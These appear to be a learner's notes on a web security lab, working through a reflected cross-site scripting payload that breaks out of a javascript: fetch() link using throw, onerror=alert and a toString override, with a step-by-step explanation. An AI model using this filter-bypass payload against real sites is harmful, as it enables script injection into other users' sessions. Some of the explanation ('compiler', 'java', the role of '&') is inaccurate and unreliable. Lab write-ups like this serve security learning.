onerror is probably the way to go
/?%27onerror=alert;throw%201337\\
this did nothing
no clue what to do so checked the solution that decoded to this 
post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
Once you open a post and check the source code you see that when you click back to blog the following line is there 

javascript:fetch('/analytics', {method:'post',body:'/post?postId=4'}).finally(_ => window.location = '/')

After injecting the line contains
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')">Back to Blog</a>

Essentially we are exploiting the fetch function
What the injecting line does is

&: this character is used to tell the compiler that there are more parameters in the body
THis is done to make sure compilation doesn't stop there else the rest of the code wouldn't work
x=...:After the , we essentially are creating a => function in java and assigning it to the 
variable x. This is simply an alert function which alerts 1337
toString=x: this line essentially uses the toString overriding to now make the toString function become our x function which
is the alert function
Lastly we use the window object and make it so that the toString function is invoked by window+''
When it gets invoked it causes the alert
It occurs when we press the button because the fetch function is called only after the button is clicked
